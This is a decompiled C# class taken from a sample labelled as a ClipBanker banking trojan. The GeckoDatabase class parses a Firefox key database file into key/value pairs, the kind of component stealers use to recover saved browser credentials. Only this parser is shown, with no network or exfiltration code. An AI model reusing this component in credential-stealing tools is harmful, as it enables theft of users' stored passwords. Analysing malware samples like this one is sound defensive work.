// Decompiled with JetBrains decompiler
// Type: FtpClient.Data.Browsers.Gecko.GeckoDatabase
// Assembly: Baignoire, Version=12.5.1.3, Culture=neutral, PublicKeyToken=null
// MVID: 0AA7C5E4-9380-4A35-BE75-5D7E722D7BE8
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan-Banker.MSIL.ClipBanker.gen-4d94148f1dff68b03896e3fa5508c5b039b0a29b1fd90db01884137f2e9495a4.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Text;

namespace FtpClient.Data.Browsers.Gecko
{
  public class GeckoDatabase
  {
    public List<KeyValuePair<string, string>> Keys { get; }

    public GeckoDatabase(string FileName)
    {
      this.Keys = new List<KeyValuePair<string, string>>();
      byte[] source = File.ReadAllBytes(FileName);
      BitConverter.ToString(this.Calculate(source, 0, 4, false)).Replace("-", "");
      BitConverter.ToString(this.Calculate(source, 4, 4, false)).Replace("-", "");
      int int32 = BitConverter.ToInt32(this.Calculate(source, 12, 4, true), 0);
      int num1 = int.Parse(BitConverter.ToString(this.Calculate(source, 56, 4, false)).Replace("-", ""));
      int num2 = 1;
      while (this.Keys.Count < num1)
      {
        string[] array = new string[(num1 - this.Keys.Count) * 2];
        for (int index = 0; index < (num1 - this.Keys.Count) * 2; ++index)
          array[index] = BitConverter.ToString(this.Calculate(source, int32 * num2 + 2 + index * 2, 2, true)).Replace("-", "");
        Array.Sort<string>(array);
        for (int index = 0; index < array.Length; index += 2)
        {
          int start1 = Convert.ToInt32(array[index], 16) + int32 * num2;
          int start2 = Convert.ToInt32(array[index + 1], 16) + int32 * num2;
          int num3 = index + 2 >= array.Length ? int32 + int32 * num2 : Convert.ToInt32(array[index + 2], 16) + int32 * num2;
          string key = Encoding.ASCII.GetString(this.Calculate(source, start2, num3 - start2, false));
          string str = BitConverter.ToString(this.Calculate(source, start1, start2 - start1, false));
          if (!string.IsNullOrEmpty(key))
            this.Keys.Add(new KeyValuePair<string, string>(key, str));
        }
        ++num2;
      }
    }

    private byte[] Calculate(byte[] source, int start, int length, bool littleEndian)
    {
      byte[] numArray = new byte[length];
      int index1 = 0;
      for (int index2 = start; index2 < start + length; ++index2)
      {
        numArray[index1] = source[index2];
        ++index1;
      }
      if (littleEndian)
        Array.Reverse((Array) numArray);
      return numArray;
    }

    public string GetValue(Func<string, bool> predicate)
    {
      string empty = string.Empty;
      try
      {
        foreach (KeyValuePair<string, string> key in this.Keys)
        {
          if (predicate(key.Key))
            empty = key.Value;
        }
      }
      catch
      {
      }
      return empty.Replace("-", string.Empty);
    }
  }
}
